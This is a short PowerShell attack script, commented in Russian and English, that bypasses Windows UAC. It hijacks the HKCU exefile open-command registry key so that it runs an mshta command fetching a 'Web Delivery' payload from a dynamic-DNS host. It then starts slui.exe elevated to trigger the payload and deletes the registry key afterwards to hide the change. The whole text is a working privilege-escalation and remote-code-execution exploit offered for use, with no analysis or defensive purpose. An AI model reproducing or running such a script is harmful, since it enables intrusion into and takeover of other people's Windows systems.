#Out Command | Наш пейлоад в моем случае вектор Web Delivery
$command = "mshta http://vcrypte.ddns.net:2222/c65A3"


#Create Registry KEY | Создаем ключ в реестре для асоциации бинарных файлов и прописываем действие обработчику EXE файлов:

New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force

#Start slui.exe as Admin | Запускаем от имени админа
Start-Process "C:\Windows\System32\slui.exe" -Verb runas


#Remove registry structure | Удаляем асоциацию файлов
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
